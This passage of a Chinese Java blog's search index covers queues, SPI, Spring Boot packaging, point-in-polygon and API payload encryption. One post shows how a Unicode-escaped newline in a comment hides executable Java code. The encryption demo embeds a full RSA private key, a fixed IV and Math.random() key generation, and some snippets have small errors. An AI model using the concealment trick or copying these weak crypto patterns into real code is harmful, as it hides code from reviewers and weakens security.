class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>上述两种实现，都是作为参考实现。具体可能有边界值判断的问题存在</li>\n</ul>\n<p>链表的实现队列长度是无限长，这和链表的特性有关。数组为指定大小的容器存储队列数据，也可以对数组进行扩容。</p>\n<p>Queue主要有两个子接口Deque（双端队列）、BlockingQueue（阻塞队列）、AbstractQueue（抽象类）</p>\n","categories":["Java基础"],"tags":["Queue","数据结构"]},{"title":"Java基础-Queue（2）AbstractQueue","url":"/2020/11/03/Java%E5%9F%BA%E7%A1%80-Queue-2-AbstractQueue/","content":"<p>在Java中Queue类主要存在两个子接口、一个抽象子类AbstractQueue。<br>AbstractQueue继承AbstractCollection和实现接口Queue，不允许存在null节点，存入和删除节点是如果为null会直接报错。</p>\n<span id=\"more\"></span>\n<h3 id=\"AbstractQueue实现方法\"><a href=\"#AbstractQueue实现方法\" class=\"headerlink\" title=\"AbstractQueue实现方法\"></a>AbstractQueue实现方法</h3><ul>\n<li>add，直接调用offer方法，如果成功返回true，失败抛出异常</li>\n<li>remove，直接调用poll方法，如果返回null抛出异常</li>\n<li>element，直接调用peek方法，如果返回为null，抛出异常，在Queue接口中该方法注释为，element和peek方法类似，都是只是查看队列头部数据，并不取出数据，区别在于peek方法如果没数据返回null，element没数据抛出异常。</li>\n<li>clear，循环调用poll方法，直到返回为null</li>\n<li>addAll，如果入参不能为null和本身，循环传入集合，调用add方法，只要有一个添加成功，返回true</li>\n</ul>\n<h3 id=\"AbstractQueue子类\"><a href=\"#AbstractQueue子类\" class=\"headerlink\" title=\"AbstractQueue子类\"></a>AbstractQueue子类</h3><p>AbstractQueue子类有</p>\n<blockquote>\n<ul>\n<li><strong>LinkedTransferQueue</strong>、</li>\n</ul>\n</blockquote>\n<ul>\n<li><strong>SynchronousQueue</strong></li>\n<li><strong>PriorityQueue</strong></li>\n<li><strong>LinkedBlockingQueue</strong></li>\n<li><strong>PriorityBlockingQueue</strong></li>\n<li><strong>ArrayBlockingQueue</strong></li>\n<li><strong>LinkedBlockingDeque</strong></li>\n<li><strong>DelayQueue</strong></li>\n<li><strong>ConcurrentLinkedQueue</strong></li>\n</ul>\n<p>其中部分之类实现了另外的Queue子接口。单一实现AbstractQueue子类有<strong>PriorityQueue</strong>、<strong>ConcurrentLinkedQueue</strong>。</p>\n","categories":["Java基础"],"tags":["Queue","数据结构","AbstractQueue"]},{"title":"Java SPI基本使用","url":"/2020/11/12/Java-SPI%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","content":"<p>之前看slf4j-api源码时，2.0版本中切换不同的日志，采用的就是SPI。通过定义接口，不同的日志框架实现该接口，对于使用方而言，通过JDK提供的方法找到实现的类并构建对象。接口不直接实现，又其他第三方实现该接口，支持热插拔。</p>\n<blockquote>\n<p>slf4j-api 1.*版本并不是用的这种方法，是通过自定义类<strong>org.slf4j.impl.StaticLoggerBinder</strong>，实现使用不同的日志。</p>\n</blockquote>\n<span id=\"more\"></span>\n<p>SPI全称为<strong>Service Provider Interface</strong>。</p>\n<ol>\n<li><p>构建项目A，添加接口</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">SPIInterface</span> &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    String <span class=\"title function_\">read</span><span class=\"params\">()</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">write</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>构建项目B，添加上面接口实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SPIDemo</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">SPIInterface</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">read</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;whhxz&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">write</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name + <span class=\"string\">&quot;-&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在项目B中，在<strong>resource</strong>下面添加目录<strong>META-INF&#x2F;services</strong>，在该目录下添加文件<strong>com.whhxz.demo.SPIInterface</strong>（接口名称），文件内容为<strong>com.whhxz.demo.SPIDemo</strong>（实现类名）</p>\n</li>\n<li><p>构建项目C，在项目C中添加B依赖</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        ServiceLoader&lt;SPIInterface&gt; demo = ServiceLoader.load(SPIInterface.class);</span><br><span class=\"line\">        Iterator&lt;SPIInterface&gt; iterator = demo.iterator();</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (iterator.hasNext())&#123;</span><br><span class=\"line\">            <span class=\"type\">SPIInterface</span> <span class=\"variable\">spi</span> <span class=\"operator\">=</span> iterator.next();</span><br><span class=\"line\">            System.out.println(spi.read());</span><br><span class=\"line\">            System.out.println(spi.write(<span class=\"string\">&quot;whh&quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在项目C中，通过<strong>ServiceLoader.load</strong>获取接口的实现。实现原理是通过扫描获取实现类，通过<strong>newInstance</strong>构建对象。</p>\n</li>\n</ol>\n<p>在使用SPI中，缺点是不是线程安全，且只能一次获取所有的接口，如果有大量实现时，可能性能较慢。</p>\n","categories":["Java基础"],"tags":["SPI"]},{"title":"Java代码隐藏代码","url":"/2022/09/08/Java%E4%BB%A3%E7%A0%81%E9%9A%90%E8%97%8F%E4%BB%A3%E7%A0%81/","content":"<p>Java代码中可以通过Unicode注释后隐藏部分实际代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">demo</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// \\u000d System.out.println(&quot;Hello&quot;);</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码会输出<strong>Hello</strong>，因为前面unicode会转义为换行，后面的代码正常执行。后面代码也可以全部转义为unicode，用于隐藏，如下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">demo</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// \\u000d \\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u002e\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0048\\u0065\\u006c\\u006c\\u006f\\u0022\\u0029\\u003b</span></span><br><span class=\"line\">    \\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u002e\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0048\\u0065\\u006c\\u006c\\u006f\\u0022\\u0029\\u003b</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述会输出2次<strong>Hello</strong>。</p>\n","categories":["Java"],"tags":["小技巧"]},{"title":"spring-boot打包jar问题","url":"/2022/09/14/spring-boot%E6%89%93%E5%8C%85jar%E9%97%AE%E9%A2%98/","content":"<p>最近公司要求修改依赖为公司统一封装的SpringBoot，里面包含了注册中心等配置，方便统一管理。</p>\n<p>开发SpringBoot项目一般默认继承<strong>spring-boot-starter-parent</strong>，这次要求默认继承公司内部的依赖。同时把以前打包的<strong>war</strong>改为<strong>jar</strong>，最后打包发现只是普通的jar打包编译，也没有依赖。</p>\n<span id=\"more\"></span>\n<p>原本使用的<em>spring-boot-maven-plugin</em>如下</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">fork</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">fork</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>解决办法如下，添加配置参数。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">fork</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">fork</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">mainClass</span>&gt;</span>com.rtmart.promotion.api.RTMartPromotionApiApplication<span class=\"tag\">&lt;/<span class=\"name\">mainClass</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">layout</span>&gt;</span>ZIP<span class=\"tag\">&lt;/<span class=\"name\">layout</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>repackage<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>经过测试<strong>mainClass</strong>和<strong>layout</strong>可以选择不要，一样可以生效</li>\n</ul>\n<blockquote>\n<p>参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYWNtLWJpbmd6aS9wL21hdmVuc3ByaW5nYm9vdHBsdWdpbi5odG1s\">https://www.cnblogs.com/acm-bingzi/p/mavenspringbootplugin.html<i class=\"fa fa-external-link-alt\"></i></span></p>\n</blockquote>\n","categories":["SpringBoot","Maven"],"tags":["SpringBoot","Maven","工作问题","依赖"]},{"title":"计算点是否在多边形内","url":"/2022/09/14/%E8%AE%A1%E7%AE%97%E7%82%B9%E6%98%AF%E5%90%A6%E5%9C%A8%E5%A4%9A%E8%BE%B9%E5%BD%A2%E5%86%85/","content":"<p>现有一个多边形，和一个点，需要判断点是否在多边形内。<br>几种情况：</p>\n<ul>\n<li>点在边上</li>\n<li>点在多边形顶点上</li>\n<li>点在多边形内</li>\n</ul>\n<p>方法通过射线法，从点发出一条射线，如果穿过多边形，偶数个交点表示在多边形外；奇数个交点在多边形内。<br>特殊情况：</p>\n<ul>\n<li>点的射线和多边形边重合</li>\n<li>点的射线刚刚好经过多边形的点<span id=\"more\"></span>\n代码实现如下：<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">pointInPolygon</span><span class=\"params\">(<span class=\"type\">double</span>[][] polygon, <span class=\"type\">double</span>[] point)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (polygon.length &lt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">double</span> <span class=\"variable\">x</span> <span class=\"operator\">=</span> point[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"type\">double</span> <span class=\"variable\">y</span> <span class=\"operator\">=</span> point[<span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>, j = polygon.length - <span class=\"number\">1</span>; i &lt; polygon.length; j = i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">x1</span> <span class=\"operator\">=</span> polygon[i][<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">y1</span> <span class=\"operator\">=</span> polygon[i][<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">x2</span> <span class=\"operator\">=</span> polygon[j][<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">y2</span> <span class=\"operator\">=</span> polygon[j][<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"comment\">//点位重合</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((x == x1 &amp;&amp; y == y1) || (x == x2 &amp;&amp; y == y2)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//斜率为0，点在线段上</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (y == y1 &amp;&amp; y == y2 &amp;&amp; x &gt;= Math.min(x1, x2) &amp;&amp; x &lt;= Math.max(x1, x2)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//判断y坐标是否在范围内，该判断解决了点射线刚刚好经过多边形的点情况  TODO后面需要补充原理</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((y &gt; y1 &amp;&amp; y &lt;= y2) || (y &gt; y2 &amp;&amp; y &lt;= y1)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//点x轴方向射线与线段的交集</span></span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">tmpX</span> <span class=\"operator\">=</span> x1 + (x2 - x1) * (y - y1) / (y2 - y1);</span><br><span class=\"line\">            <span class=\"comment\">//如果需要忽略浮点数计算导致精度丢失的问题，可以通过添加容差后判断值是否在容差范围</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (x == tmpX) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (x &lt; tmpX) &#123;</span><br><span class=\"line\">                in = !in;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> in;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>参考：</p>\n<blockquote>\n<ul>\n<li>原代码实现应该有bug <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3Vuc2t5MzAzL3AvMTY0NjgyMzQuaHRtbA==\">https://www.cnblogs.com/sunsky303/p/16468234.html<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n</blockquote>\n","categories":["算法"],"tags":["算法","未补全"]},{"title":"一次前后端API交互数据加密","url":"/2022/10/26/%E4%B8%80%E6%AC%A1%E5%89%8D%E5%90%8E%E7%AB%AFAPI%E4%BA%A4%E4%BA%92%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/","content":"<p>一次合规要求，需要对关键接口进行加密传输。<br>处理流程如下：<br><img src=\"/images/2022/10/1666750206503.png\"></p>\n<p>流程简化过，公私钥提前分配到前后端。</p>\n<span id=\"more\"></span>\n<h3 id=\"前端传递密钥\"><a href=\"#前端传递密钥\" class=\"headerlink\" title=\"前端传递密钥\"></a>前端传递密钥</h3><p>前端生成随机32位（数字+字谜）AES密钥</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//随机字符串，生成密钥</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">randomString</span>(<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">    e = e || <span class=\"number\">32</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> t = <span class=\"string\">&quot;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz1234567890&quot;</span>,</span><br><span class=\"line\">        a = t.<span class=\"property\">length</span>,</span><br><span class=\"line\">        n = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; e; i++) n += t.<span class=\"title function_\">charAt</span>(<span class=\"title class_\">Math</span>.<span class=\"title function_\">floor</span>(<span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>() * a));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//公钥加密密钥</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">rsaEncrypt</span>(<span class=\"params\">secretKey</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> publicKey = <span class=\"string\">&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+FMib8idOCv4WDYuc+7ROGXriloJGYLZiLDBmDz/Jrj5vraFPg6XEU1dr6Mx9XpuPPbnyaaN2R9IYWcuXixCt9YK9BQoVyzH2+XqmmIpYOh1nWV5Hba6bPC+aCgGN/w782lCGspElST3Q2wsI8f2E19IWH9Y56GnJVGziGxeD6wIDAQAB-----END PUBLIC KEY-----&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//使用 jsencrypt</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> encryptor = <span class=\"keyword\">new</span> <span class=\"title class_\">JSEncrypt</span>()</span><br><span class=\"line\">    encryptor.<span class=\"title function_\">setPublicKey</span>(publicKey)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> encryptor.<span class=\"title function_\">encrypt</span>(secretKey)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//BODY sha-256</span></span><br><span class=\"line\"><span class=\"comment\">//需要优化，不能实际使用，一般是通过对json key进行排序（按字典顺序）</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">genSha256</span>(<span class=\"params\">data, ...keys</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> data2urparams = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; keys.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> key = keys[i]</span><br><span class=\"line\">        data2urparams += key + <span class=\"string\">&#x27;=&#x27;</span> + data[key] + <span class=\"string\">&#x27;&amp;&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (data2urparams.<span class=\"title function_\">endsWith</span>(<span class=\"string\">&#x27;&amp;&#x27;</span>)) &#123;</span><br><span class=\"line\">        data2urparams = data2urparams.<span class=\"title function_\">substring</span>(<span class=\"number\">0</span>, data2urparams.<span class=\"property\">length</span> - <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//nodejs使用 crypto-js</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title class_\">CryptoJS</span>.<span class=\"title class_\">SHA256</span>(data2urparams).<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">demo</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> secretKey = <span class=\"title function_\">randomString</span>()</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;AES密钥&#x27;</span>, secretKey)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> requestBody = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;key&#x27;</span>: secretKey,</span><br><span class=\"line\">        <span class=\"string\">&#x27;demo&#x27;</span>: <span class=\"string\">&#x27;中文&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> hash256 = <span class=\"keyword\">await</span> <span class=\"title function_\">genSha256</span>(requestBody, <span class=\"string\">&#x27;key&#x27;</span>, <span class=\"string\">&#x27;demo&#x27;</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(hash256)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> encryptBody = <span class=\"title function_\">rsaEncrypt</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(requestBody))</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;加密后内容&#x27;</span>, encryptBody)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//例子</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">未加密数据库</span></span><br><span class=\"line\"><span class=\"comment\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">    &#x27;key&#x27;: &#x27;2fC4Q4z6WeD8iQ4TnSP9eBjFR02Ejzw4&#x27;,</span></span><br><span class=\"line\"><span class=\"comment\">    &#x27;demo&#x27;: &#x27;中文&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">sha-256</span></span><br><span class=\"line\"><span class=\"comment\">04327dc37a0ff5c627279c1687698222cac8205642b6af4abf36632db79f3c63</span></span><br><span class=\"line\"><span class=\"comment\">加密base64后数据</span></span><br><span class=\"line\"><span class=\"comment\">KLU7x0K4EEFE6vFVBgFu02hjLGq4HBZwX+W/SYatpzY6+yaEYwYdKX+1coyotVsZtXWL/BMEBCNJ3/8MBwcyOIEUZ8g7No4zWHIQzUNrWDlxC0+tGw05JuYSD1EKEyMPMzDgvxK7wTpTbtZfIrlDfvthE7bhmRns3v44zKNn9jE=</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"后端解密数据\"><a href=\"#后端解密数据\" class=\"headerlink\" title=\"后端解密数据\"></a>后端解密数据</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//使用hutool解密</span></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">privateKey</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4UyJvyJ04K/hYN&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;i5z7tE4ZeuKWgkZgtmIsMGYPP8muPm+toU+DpcRTV2vozH1em489ufJpo3ZH0hhZ&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;y5eLEK31gr0FChXLMfb5eqaYilg6HWdZXkdtrps8L5oKAY3/DvzaUIaykSVJPdDb&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;Cwjx/YTX0hYf1jnoaclUbOIbF4PrAgMBAAECgYB/+oRbIv49uH78oCAZEQuD7fnj&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;54xNED6b+L6ZaLj89FlLXe8XFz8b4TUiDXrpCjLYjanNwjxxnceh54uBO/t8yweI&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;7jskVoaWStotK5sgpTUjiF5hdLsR4RCsnH/zZ+pTf2+9PN4V6j4CIdFQjn5/rIFb&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;/HbzqfES88rz6dFCIQJBAOrhUwUikYRwNr9PSC1UuM/VRhEUAXGHLGRKmmLpCMNn&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;uqGYBMBPwIQOQPLmaCTpt5FC51GbBCwMwgWuyFebCrsCQQDPLDzD365dJWJwsOmH&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;A+mMHleE/+cELLtxQOHNTXGwGFNa+PvZHWO5W0gVMNC5Z0mPQp1teIzvmwO3lHC6&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;BFCRAkEAqcvEKXUo/zXjzf8xbVvO0qgaI+Rzeq++Xq4z14chR6moGIN+A8xjntNz&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;DmWUKgMvKfrUoIDQzktWw6bru7EgWwJBAIaRPHMacr6sDtIWB8ocP3I1LzIDqsHq&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;cGJy+3iISkVQt6wKuEPhtCns4dhp2dnj/kLgyTMXL6xfKz3uXH5nWRECQFCraEHB&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;Opw0MnLay6yKawaVbvgknHS4LjYSY5rzwKlo16Ab7EEtm2G8mnOOBB8r7U/FXgBJ&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;rhucymdoEn747T8=&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">RSA</span> <span class=\"variable\">rsa</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RSA</span>(privateKey, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;KLU7x0K4EEFE6vFVBgFu02hjLGq4HBZwX+W/SYatpzY6+yaEYwYdKX+1coyotVsZtXWL/BMEBCNJ3/8MBwcyOIEUZ8g7No4zWHIQzUNrWDlxC0+tGw05JuYSD1EKEyMPMzDgvxK7wTpTbtZfIrlDfvthE7bhmRns3v44zKNn9jE=&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">byte</span>[] decrypt = rsa.decrypt(body, KeyType.PrivateKey);</span><br><span class=\"line\">System.out.println(StrUtil.str(decrypt, CharsetUtil.CHARSET_UTF_8));</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"前端加密请求数据\"><a href=\"#前端加密请求数据\" class=\"headerlink\" title=\"前端加密请求数据\"></a>前端加密请求数据</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//aes加密，返回为base64</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">aesEncrypt</span>(<span class=\"params\">secretkey, body</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> key = <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">enc</span>.<span class=\"property\">Utf8</span>.<span class=\"title function_\">parse</span>(secretkey);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> iv = <span class=\"title class_\">CryptoJS</span>.<span class=\"property\">enc</span>.<span class=\"property\">Utf8</span>.<span class=\"title function_\">parse</span>(<span class=\"string\">&quot;1234567890123456&quot;</span>);</span><br><span class=\"line\">    <span class=\"comment\">//加密模式为CBC，补码方式为PKCS5Padding（也就是PKCS7）</span></span><br><span 